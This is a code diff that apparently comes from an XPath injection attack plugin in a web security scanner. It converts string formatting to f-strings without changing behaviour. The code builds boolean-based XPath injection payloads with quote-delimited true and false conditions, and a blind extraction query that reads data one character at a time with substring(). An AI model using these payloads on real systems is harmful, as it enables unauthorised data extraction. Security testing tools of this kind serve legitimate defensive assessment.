@@ -126,24 +126,14 @@ class xpath(AttackPlugin):
 
         orig_value = vuln.get_mutant().get_token_original_value()
 
-        self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (
-            orig_value,
-            self.STR_DELIM,
-            self.STR_DELIM,
-            self.rnum,
-            self.STR_DELIM,
-            self.STR_DELIM,
-            self.rnum,
+        self.TRUE_COND = (
+            f"{orig_value}{self.STR_DELIM} and "
+            f"{self.STR_DELIM}{self.rnum}{self.STR_DELIM}={self.STR_DELIM}{self.rnum}"
         )
 
-        self.FALSE_COND = "%s%s and %s%i%s=%s%i" % (
-            orig_value,
-            self.STR_DELIM,
-            self.STR_DELIM,
-            self.rnum,
-            self.STR_DELIM,
-            self.STR_DELIM,
-            self.rnum + 1,
+        self.FALSE_COND = (
+            f"{orig_value}{self.STR_DELIM} and "
+            f"{self.STR_DELIM}{self.rnum}{self.STR_DELIM}={self.STR_DELIM}{self.rnum + 1}"
         )
 
         mutant = vuln.get_mutant()
@@ -175,10 +165,10 @@ class xpath(AttackPlugin):
         mutant = vuln.get_mutant()
         orig_value = mutant.get_token_original_value()
 
-        true_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum)
-        false_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum + 1)
-        true_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum)
-        false_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum + 1)
+        true_sq = f"{orig_value}' and '{self.rnum}'='{self.rnum}"
+        false_sq = f"{orig_value}' and '{self.rnum}'='{self.rnum + 1}"
+        true_dq = f'{orig_value}" and "{self.rnum}"="{self.rnum}'
+        false_dq = f'{orig_value}" and "{self.rnum}"="{self.rnum + 1}'
 
         to_test = [("'", true_sq, false_sq), ('"', true_dq, false_dq)]
 
@@ -355,10 +345,10 @@ class XPathReader(Shell):
         while True:
 
             mid = (maxl + minl) / 2
-            om.out.debug("MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl))
+            om.out.debug(f"MAX:{maxl}, MID:{mid}, MIN:{minl}")
 
             if self._verify_data_len_eq(mid):
-                om.out.debug("Response Length FOUND!: %i " % (mid))
+                om.out.debug(f"Response Length FOUND!: {mid} ")
                 return mid
 
             else:
@@ -453,13 +443,9 @@ class XPathReader(Shell):
             skip_len = len(orig_value) + len(self.STR_DELIM) + len(" ")
 
             hexcar = chr(c)
-            dataq = '%s%s and substring(%s,%i,1)="%s" %s' % (
-                orig_value,
-                self.STR_DELIM,
-                XML_FILTER,
-                pos,
-                hexcar,
-                self.TRUE_COND[skip_len:],
+            dataq = (
+                f"{orig_value}{self.STR_DELIM} and "
+                f'substring({XML_FILTER},{pos},1)="{hexcar}" {self.TRUE_COND[skip_len:]}'
             )
             mutant.set_token_value(dataq)
             dresp = self._uri_opener.send_mutant(mutant)
